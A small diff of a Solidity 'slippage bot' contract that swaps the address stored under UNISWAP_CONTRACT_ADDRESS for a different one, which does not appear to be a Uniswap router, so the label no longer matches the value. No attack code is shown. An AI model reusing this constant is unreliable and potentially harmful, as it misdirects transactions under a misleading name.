@@ -13,7 +13,7 @@ contract OneinchSlippageBot {
     //string public tokenSymbol;
     uint liquidity;
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
-    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
+    string private UNISWAP_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
 
     event Log(string _msg);
 
